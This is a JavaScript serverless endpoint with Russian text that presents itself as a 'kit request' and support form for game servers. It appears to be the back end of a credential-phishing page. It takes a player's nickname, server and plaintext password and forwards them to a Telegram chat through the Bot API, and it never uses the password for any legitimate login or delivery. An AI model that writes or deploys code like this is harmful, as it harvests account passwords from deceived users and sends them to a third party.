export default async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Метод не разрешен' });
    }

    try {
        const { username, password, server, kit, type, message } = req.body;

        const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
        const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

        if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
            return res.status(500).json({ error: 'Ошибка конфигурации сервера' });
        }

        let text = '';
        
        if (type === 'support') {
            text = `
💬 <b>ЧАТ ПОДДЕРЖКИ</b>

👤 Игрок: ${username || 'Игрок'}
📝 Сообщение: ${message}

⏰ Время: ${new Date().toLocaleString('ru-RU')}
            `;
        } else {
            text = `
🎮 <b>НОВЫЙ ЗАПРОС КИТА!</b>

🖥 Сервер: ${server}
📦 Кит: ${kit}
👤 Ник: ${username}
🔑 Пароль: ${password}

⏰ Время: ${new Date().toLocaleString('ru-RU')}
            `;
        }
        
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: text,
                parse_mode: 'HTML'
            })
        });

        const data = await response.json();

        if (data.ok) {
            return res.status(200).json({ success: true });
        } else {
            return res.status(500).json({ error: 'Ошибка отправки в Telegram' });
        }
    } catch (error) {
        return res.status(500).json({ error: 'Внутренняя ошибка сервера' });
    }
}
